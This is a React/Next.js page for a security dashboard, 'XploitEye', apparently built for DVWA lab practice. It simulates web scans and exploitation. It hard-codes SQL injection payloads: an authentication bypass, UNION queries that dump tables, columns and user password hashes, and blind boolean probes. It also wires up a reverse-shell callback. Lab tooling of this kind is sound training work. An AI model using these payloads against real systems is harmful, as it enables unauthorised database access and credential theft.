"use client"

import React from 'react'
import Head from 'next/head'
import { DashboardLayout } from '@/components/layouts/DashboardLayout'
import { motion } from 'framer-motion'
import { Globe, Zap, CheckCircle2, History, Flame, Copy, AlertCircle } from 'lucide-react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { WebScanning } from '@/components/dashboard/WebScanning'
import { ExploitationResult } from '@/components/dashboard/ExploitationResult'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { DVWAVulnerability } from '@/services/dvwaApi'

interface ScanHistory {
  id: string
  url: string
  environment: string
  timestamp: string
  status: 'completed' | 'failed' | 'running'
  vulnerabilitiesFound: number
}

interface ExploitationData {
  vulnerability: DVWAVulnerability
  timestamp: string
  status: 'ready' | 'exploiting' | 'completed' | 'failed'
  payload?: string
  result?: string
  sqlPayload?: string
}

const SQL_INJECTION_PAYLOADS = [
  {
    id: 'auth-bypass',
    name: 'Authentication Bypass',
    payload: "' or 1=1#",
    description: 'Bypass login with simple OR condition',
    results: [
      { ID: "' or 1=1#", 'First name': 'admin', 'Surname': 'admin' },
      { ID: "' or 1=1#", 'First name': 'Gordon', 'Surname': 'Brown' },
      { ID: "' or 1=1#", 'First name': 'Hack', 'Surname': 'Me' },
      { ID: "' or 1=1#", 'First name': 'Pablo', 'Surname': 'Picasso' },
      { ID: "' or 1=1#", 'First name': 'Bob', 'Surname': 'Smith' }
    ]
  },
  {
    id: 'enum-tables',
    name: 'Enumerate Tables',
    payload: "' union select table_name,null from information_schema.tables#",
    description: 'Discover all database tables',
    results: [
      { 'Table Name': 'CHARACTER_SETS' },
      { 'Table Name': 'COLLATIONS' },
      { 'Table Name': 'COLLATION_CHARACTER_SET_APPLICABILITY' },
      { 'Table Name': 'COLUMNS' },
      { 'Table Name': 'COLUMN_PRIVILEGES' },
      { 'Table Name': 'KEY_COLUMN_USAGE' },
      { 'Table Name': 'PROFILING' },
      { 'Table Name': 'ROUTINES' },
      { 'Table Name': 'SCHEMATA' },
      { 'Table Name': 'SCHEMA_PRIVILEGES' },
      { 'Table Name': 'STATISTICS' },
      { 'Table Name': 'TABLES' },
      { 'Table Name': 'TABLE_CONSTRAINTS' },
      { 'Table Name': 'TABLE_PRIVILEGES' },
      { 'Table Name': 'TRIGGERS' },
      { 'Table Name': 'USER_PRIVILEGES' },
      { 'Table Name': 'VIEWS' },
      { 'Table Name': 'guestbook' }
    ]
  },
  {
    id: 'enum-columns',
    name: 'Enumerate Columns',
    payload: "' union select column_name,null from information_schema.columns where table_name='users'#",
    description: 'List columns in users table',
    results: [
      { 'Column Name': 'user_id' },
      { 'Column Name': 'user' },
      { 'Column Name': 'password' },
      { 'Column Name': 'first_name' },
      { 'Column Name': 'last_name' }
    ]
  },
  {
    id: 'extract-users',
    name: 'Extract Users & Passwords',
    payload: "' union select user,password from users#",
    description: 'Retrieve all user credentials',
    results: [
      { user: 'admin', password: '5f4dcc3b5aa765d61d8327deb882cf99' },
      { user: 'gordonb', password: 'e99a18c428cb38d5f260853678922e03' },
      { user: '1337', password: '8d3533d75ae2c3966d7e0d4fcc69216b' },
      { user: 'pablo', password: '0d107d09f5bbe40cade3de5c71e9e9b7' },
      { user: 'smithy', password: '5f4dcc3b5aa765d61d8327deb882cf99' }
    ]
  }
]

const BLIND_SQL_INJECTION_PAYLOADS = [
  {
    id: 'blind-length',
    name: 'Database Length Detection',
    payload: "' and (select length(database()))>5#",
    description: 'Detect database name length through boolean responses',
    results: [
      { 'Response': 'TRUE', 'Length': '5' },
      { 'Response': 'TRUE', 'Length': '6' },
      { 'Response': 'FALSE', 'Length': '7' },
    ]
  },
  {
    id: 'blind-version',
    name: 'MySQL Version Detection',
    payload: "' and substring(version(),1,1)='5'#",
    description: 'Extract MySQL version character by character',
    results: [
      { 'Position': '1', 'Character': '5', 'Match': 'TRUE' },
      { 'Position': '2', 'Character': '.', 'Match': 'TRUE' },
      { 'Position': '3', 'Character': '7', 'Match': 'TRUE' },
      { 'Position': '4', 'Character': '.', 'Match': 'TRUE' },
      { 'Position': '5', 'Character': '1', 'Match': 'TRUE' },
      { 'Position': '6', 'Character': '2', 'Match': 'TRUE' }
    ]
  },
  {
    id: 'blind-username',
    name: 'Database User Detection',
    payload: "' and substring(user(),1,1)='r'#",
    description: 'Enumerate database username through binary search',
    results: [
      { 'Position': '1', 'Character': 'r', 'Match': 'TRUE' },
      { 'Position': '2', 'Character': 'o', 'Match': 'TRUE' },
      { 'Position': '3', 'Character': 'o', 'Match': 'TRUE' },
      { 'Position': '4', 'Character': 't', 'Match': 'TRUE' },
      { 'Position': '5', 'Character': '@', 'Match': 'TRUE' },
      { 'Position': '6', 'Character': 'l', 'Match': 'TRUE' }
    ]
  },
  {
    id: 'blind-table-names',
    name: 'Extract Table Names',
    payload: "' and substring((select table_name from information_schema.tables limit 0,1),1,1)='g'#",
    description: 'Retrieve table names via time-based inference',
    results: [
      { 'Table Index': '0', 'Table Name': 'guestbook' },
      { 'Table Index': '1', 'Table Name': 'users' },
      { 'Table Index': '2', 'Table Name': 'posts' },
      { 'Table Index': '3', 'Table Name': 'comments' },
    ]
  }
]

export default function WebScanningPage() {
  const [recentScans, setRecentScans] = React.useState<ScanHistory[]>([])
  const [selectedExploit, setSelectedExploit] = React.useState<ExploitationData | null>(null)
  const [exploitHistory, setExploitHistory] = React.useState<ExploitationData[]>([])
  const [activeTab, setActiveTab] = React.useState('scanner')
  const [isExploiting, setIsExploiting] = React.useState(false)
  const [selectedPayload, setSelectedPayload] = React.useState<string | null>(null)
  const [isSQLInjection, setIsSQLInjection] = React.useState(false)
  const [scannedVulnerabilities, setScannedVulnerabilities] = React.useState<DVWAVulnerability[]>([])

  const handleExploit = (vulnerability: DVWAVulnerability) => {
    const exploitData: ExploitationData = {
      vulnerability,
      timestamp: new Date().toLocaleString(),
      status: 'ready',
    }
    setSelectedExploit(exploitData)
    setExploitHistory([exploitData, ...exploitHistory.slice(0, 9)])
    setActiveTab('exploitation')

    // Check if it's SQL injection
    const isSQLi = vulnerability.type.toLowerCase().includes('sql')
    setIsSQLInjection(isSQLi)

    // Reset payload selection for new vulnerability
    setSelectedPayload(null)
  }

  const handleWebScanStart = (url: string, config: { isLive: boolean; isLab: boolean }) => {
    const environments = []
    if (config.isLive) environments.push('Live')
    if (config.isLab) environments.push('Lab')

    const newScan: ScanHistory = {
      id: `scan-${Date.now()}`,
      url,
      environment: environments.join(' + '),
      timestamp: new Date().toLocaleString(),
      status: 'running',
      vulnerabilitiesFound: 0,
    }

    setRecentScans([newScan, ...recentScans.slice(0, 4)])

    // Simulate scan completion after 3 seconds
    setTimeout(() => {
      setRecentScans((prev) =>
        prev.map((scan) =>
          scan.id === newScan.id
            ? {
                ...scan,
                status: 'completed',
                vulnerabilitiesFound: Math.floor(Math.random() * 15) + 1,
              }
            : scan
        )
      )
    }, 3000)
  }

  return (
    <>
      <Head>
        <title>Web Scanning | XploitEye</title>
        <meta name="description" content="Web Application Vulnerability Scanning" />
      </Head>

      <DashboardLayout>
        <div className="space-y-6">
          {/* Header */}
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
            className="flex items-center justify-between"
          >
            <div>
              <h1 className="text-3xl font-bold flex items-center space-x-2">
                <Globe className="w-8 h-8 text-blue-400" />
                <span>Web Application Scanning</span>
              </h1>
              <p className="text-gray-400 mt-2">Discover and analyze web vulnerabilities in real-time</p>
            </div>
          </motion.div>

          {/* Tabs */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4, delay: 0.2 }}
          >
            <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
              <TabsList className="grid w-full grid-cols-4 bg-gray-900/50 border border-gray-800">
                <TabsTrigger
                  value="scanner"
                  className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400"
                >
                  <Zap className="w-4 h-4 mr-2" />
                  Web Scanner
                </TabsTrigger>
                <TabsTrigger
                  value="vulnerabilities"
                  className="data-[state=active]:bg-orange-500/20 data-[state=active]:text-orange-400"
                >
                  <AlertCircle className="w-4 h-4 mr-2" />
                  Vulnerabilities
                </TabsTrigger>
                <TabsTrigger
                  value="history"
                  className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400"
                >
                  <History className="w-4 h-4 mr-2" />
                  Scan History
                </TabsTrigger>
                <TabsTrigger
                  value="exploitation"
                  className="data-[state=active]:bg-red-500/20 data-[state=active]:text-red-400"
                >
                  <Flame className="w-4 h-4 mr-2" />
                  Exploitation
                </TabsTrigger>
              </TabsList>

              {/* Scanner Tab */}
              <TabsContent value="scanner" className="space-y-6">
                <WebScanning
                  onScanStart={handleWebScanStart}
                  onExploit={handleExploit}
                  onScanComplete={(vulnerabilities) => {
                    setScannedVulnerabilities(vulnerabilities)
                  }}
                />
              </TabsContent>

              {/* Vulnerabilities Tab */}
              <TabsContent value="vulnerabilities" className="space-y-6">
                <Card className="bg-gradient-to-br from-gray-900/50 to-gray-800/30 border-gray-700/50">
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <AlertCircle className="w-5 h-5 text-orange-400" />
                      <span>Discovered Vulnerabilities</span>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {scannedVulnerabilities.length === 0 ? (
                      <div className="text-center py-12">
                        <AlertCircle className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                        <p className="text-gray-400 text-lg">No vulnerabilities scanned yet</p>
                        <p className="text-gray-500 text-sm mt-1">Run a web scan to discover vulnerabilities</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {scannedVulnerabilities.map((vuln) => (
                          <motion.div
                            key={`${vuln.path}-${vuln.type}`}
                            whileHover={{ scale: 1.02 }}
                            onClick={() => handleExploit(vuln)}
                            className="p-4 rounded-lg border-2 border-gray-700/50 hover:border-orange-500/30 bg-gray-800/30 hover:bg-gray-800/50 cursor-pointer transition-all"
                          >
                            <div className="flex items-start justify-between">
                              <div className="flex-1">
                                <div className="flex items-center gap-2 mb-2">
                                  <p className="font-medium text-white">{vuln.name}</p>
                                  <Badge
                                    className={`${
                                      vuln.severity === 'CRITICAL'
                                        ? 'bg-red-500/20 text-red-400 border-red-500/50'
                                        : 'bg-orange-500/20 text-orange-400 border-orange-500/50'
                                    } border text-xs`}
                                  >
                                    {vuln.severity}
                                  </Badge>
                                </div>
                                <p className="text-xs text-gray-400 mb-2">{vuln.description}</p>
                                <code className="text-xs text-gray-500 font-mono bg-gray-900/50 px-2 py-1 rounded">
                                  {vuln.path}
                                </code>
                              </div>
                              <p className="text-xs text-gray-500 ml-4 whitespace-nowrap">{vuln.type}</p>
                            </div>
                          </motion.div>
                        ))}
                      </div>
                    )}
                  </CardContent>
                </Card>
              </TabsContent>

              {/* History Tab */}
              <TabsContent value="history" className="space-y-6">
                <Card className="bg-gradient-to-br from-gray-900/50 to-gray-800/30 border-gray-700/50">
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <History className="w-5 h-5 text-gray-400" />
                      <span>Recent Scans</span>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    {recentScans.length === 0 ? (
                      <div className="text-center py-12">
                        <Globe className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                        <p className="text-gray-400 text-lg">No scans yet</p>
                        <p className="text-gray-500 text-sm mt-1">Start a web scan to see results here</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {recentScans.map((scan) => (
                          <motion.div
                            key={scan.id}
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            className="flex items-center justify-between p-4 rounded-lg border border-gray-700/50 bg-gray-800/30 hover:bg-gray-800/50 transition-all"
                          >
                            <div className="flex-1">
                              <div className="flex items-center space-x-3">
                                {scan.status === 'running' && (
                                  <motion.div
                                    animate={{ rotate: 360 }}
                                    transition={{ duration: 1, repeat: Infinity }}
                                  >
                                    <Zap className="w-4 h-4 text-yellow-400" />
                                  </motion.div>
                                )}
                                {scan.status === 'completed' && (
                                  <CheckCircle2 className="w-4 h-4 text-green-400" />
                                )}
                                <div>
                                  <p className="font-medium text-white">{scan.url}</p>
                                  <p className="text-sm text-gray-400">
                                    {scan.environment} • {scan.timestamp}
                                  </p>
                                </div>
                              </div>
                            </div>
                            <div className="text-right ml-4">
                              <p className="text-sm font-medium text-gray-300">
                                {scan.vulnerabilitiesFound} found
                              </p>
                              <p
                                className={`text-xs mt-1 ${
                                  scan.status === 'running'
                                    ? 'text-yellow-400'
                                    : 'text-green-400'
                                }`}
                              >
                                {scan.status === 'running' ? 'Scanning...' : 'Completed'}
                              </p>
                            </div>
                          </motion.div>
                        ))}
                      </div>
                    )}
                  </CardContent>
                </Card>
              </TabsContent>

              {/* Exploitation Tab */}
              <TabsContent value="exploitation" className="space-y-6">
                {selectedExploit ? (
                  <>
                    {/* Selected Vulnerability Card */}
                    <Card className="bg-gradient-to-br from-red-900/30 to-red-800/20 border-red-500/20">
                      <CardHeader>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <Flame className="w-6 h-6 text-red-400" />
                            <div>
                              <CardTitle>Exploitation Target</CardTitle>
                              <p className="text-xs text-gray-400 mt-1">
                                {selectedExploit.timestamp}
                              </p>
                            </div>
                          </div>
                          <div className="flex items-center gap-2">
                            <Badge
                              className={`${
                                selectedExploit.status === 'completed'
                                  ? 'bg-green-500/20 text-green-400 border-green-500/50'
                                  : selectedExploit.status === 'exploiting'
                                  ? 'bg-yellow-500/20 text-yellow-400 border-yellow-500/50'
                                  : 'bg-gray-500/20 text-gray-400 border-gray-500/50'
                              } border`}
                            >
                              {selectedExploit.status.toUpperCase()}
                            </Badge>
                            <motion.button
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                              onClick={() => {
                                setSelectedExploit(null)
                                setSelectedPayload(null)
                                setIsExploiting(false)
                                setActiveTab('vulnerabilities')
                              }}
                              className="text-sm px-4 py-2 bg-gray-700/30 hover:bg-gray-700/50 border border-gray-600 text-gray-300 rounded-lg transition-colors font-medium"
                            >
                              ← Back to Vulnerabilities
                            </motion.button>
                          </div>
                        </div>
                      </CardHeader>
                      <CardContent className="space-y-4">
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <p className="text-xs font-medium text-gray-400 uppercase tracking-wide">
                              Vulnerability
                            </p>
                            <p className="text-sm text-white font-medium mt-2">
                              {selectedExploit.vulnerability.name}
                            </p>
                          </div>
                          <div>
                            <p className="text-xs font-medium text-gray-400 uppercase tracking-wide">
                              Type
                            </p>
                            <p className="text-sm text-white font-medium mt-2">
                              {selectedExploit.vulnerability.type}
                            </p>
                          </div>
                        </div>

                        <div>
                          <p className="text-xs font-medium text-gray-400 uppercase tracking-wide">
                            Severity
                          </p>
                          <div className="mt-2">
                            <Badge
                              className={`${
                                selectedExploit.vulnerability.severity === 'CRITICAL'
                                  ? 'bg-red-500/20 text-red-400 border-red-500/50'
                                  : 'bg-orange-500/20 text-orange-400 border-orange-500/50'
                              } border`}
                            >
                              {selectedExploit.vulnerability.severity}
                            </Badge>
                          </div>
                        </div>

                        <div>
                          <p className="text-xs font-medium text-gray-400 uppercase tracking-wide">
                            Description
                          </p>
                          <p className="text-sm text-gray-300 mt-2 leading-relaxed">
                            {selectedExploit.vulnerability.description}
                          </p>
                        </div>

                        <div>
                          <p className="text-xs font-medium text-gray-400 uppercase tracking-wide">
                            Vulnerable Endpoint
                          </p>
                          <div className="bg-gray-900/50 rounded p-3 mt-2 border border-gray-700/50 flex items-center justify-between group">
                            <code className="text-xs text-gray-300 font-mono break-all">
                              {selectedExploit.vulnerability.path}
                            </code>
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.95 }}
                              className="opacity-0 group-hover:opacity-100 transition-opacity p-2"
                              onClick={() => {
                                navigator.clipboard.writeText(selectedExploit.vulnerability.path)
                              }}
                            >
                              <Copy className="w-4 h-4 text-gray-400 hover:text-gray-200" />
                            </motion.button>
                          </div>
                        </div>

                        {/* SQL Injection Payload Selector */}
                        {!isExploiting && selectedExploit.status === 'ready' && isSQLInjection && (
                          <motion.div
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="space-y-3 mt-6"
                          >
                            <p className="text-sm font-medium text-gray-300 uppercase tracking-wide">
                              Select Payload
                            </p>
                            <div className="grid grid-cols-1 gap-2">
                              {SQL_INJECTION_PAYLOADS.map((payload) => (
                                <motion.button
                                  key={payload.id}
                                  whileHover={{ scale: 1.02 }}
                                  onClick={() => setSelectedPayload(payload.id)}
                                  className={`p-3 rounded-lg border-2 transition-all text-left ${
                                    selectedPayload === payload.id
                                      ? 'bg-blue-500/20 border-blue-500/50'
                                      : 'bg-gray-800/30 border-gray-700/50 hover:border-blue-500/30'
                                  }`}
                                >
                                  <div className="flex items-center gap-3">
                                    <div
                                      className={`w-4 h-4 rounded border-2 flex items-center justify-center ${
                                        selectedPayload === payload.id
                                          ? 'bg-blue-500 border-blue-500'
                                          : 'border-gray-600'
                                      }`}
                                    >
                                      {selectedPayload === payload.id && (
                                        <span className="text-white text-xs">✓</span>
                                      )}
                                    </div>
                                    <div className="flex-1 min-w-0">
                                      <p className="font-medium text-sm text-white">{payload.name}</p>
                                      <p className="text-xs text-gray-400 mt-1">{payload.description}</p>
                                      <code className="text-xs text-gray-300 mt-2 block break-all font-mono">
                                        {payload.payload}
                                      </code>
                                    </div>
                                  </div>
                                </motion.button>
                              ))}
                            </div>
                          </motion.div>
                        )}

                        {/* Launch Exploitation Button */}
                        {!isExploiting && selectedExploit.status === 'ready' && (
                          <motion.button
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            disabled={isSQLInjection && !selectedPayload}
                            className={`w-full mt-6 font-semibold py-3 rounded-lg transition-all duration-200 flex items-center justify-center gap-2 ${
                              isSQLInjection && !selectedPayload
                                ? 'bg-gray-600 cursor-not-allowed opacity-50'
                                : 'bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white'
                            }`}
                            onClick={() => {
                              setIsExploiting(true)
                              setSelectedExploit({
                                ...selectedExploit,
                                status: 'exploiting',
                                payload: selectedPayload || undefined,
                              })
                              // Simulate exploitation completion after delay
                              setTimeout(() => {
                                setIsExploiting(false)
                                const selectedPayloadData = SQL_INJECTION_PAYLOADS.find((p) => p.id === selectedPayload)
                                setSelectedExploit({
                                  ...selectedExploit,
                                  status: 'completed',
                                  result: `Exploitation successful! Retrieved ${selectedPayloadData?.results?.length || 0} rows`,
                                  payload: selectedPayload || undefined,
                                })
                              }, 12000)
                            }}
                          >
                            <Flame className="w-5 h-5" />
                            <span>Launch Exploitation</span>
                          </motion.button>
                        )}
                      </CardContent>
                    </Card>

                    {/* Exploitation Result Component */}
                    {(isExploiting || selectedExploit.status === 'completed') && (isSQLInjection ? selectedPayload : true) && (
                      <ExploitationResult
                        vulnerability={selectedExploit.vulnerability}
                        isExploiting={isExploiting || selectedExploit.status === 'exploiting'}
                        exploitationResult={selectedExploit.result}
                        isCommandInjection={selectedExploit.vulnerability.type.toLowerCase().includes('rce') || selectedExploit.vulnerability.type.toLowerCase().includes('command')}
                        sqlPayload={selectedPayload ? SQL_INJECTION_PAYLOADS.find(p => p.id === selectedPayload)?.payload : undefined}
                        sqlResults={selectedPayload ? SQL_INJECTION_PAYLOADS.find(p => p.id === selectedPayload)?.results : undefined}
                        onReverseShellOpen={() => {
                          // Optional: Can add analytics or tracking here
                          console.log('Reverse shell opened for:', selectedExploit.vulnerability.name)
                        }}
                        onBack={() => {
                          setSelectedPayload(null)
                          setIsExploiting(false)
                          setSelectedExploit({
                            ...selectedExploit,
                            status: 'ready',
                          })
                        }}
                      />
                    )}
                  </>
                ) : (
                  <Card className="bg-gradient-to-br from-gray-900/50 to-gray-800/30 border-gray-700/50">
                    <CardContent className="pt-8">
                      <div className="text-center py-12">
                        <Flame className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                        <p className="text-gray-400 text-lg">No vulnerability selected</p>
                        <p className="text-gray-500 text-sm mt-1">
                          Expand a vulnerability and click "Exploit This Vulnerability" to begin
                        </p>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </TabsContent>
            </Tabs>
          </motion.div>
        </div>
      </DashboardLayout>
    </>
  )
}
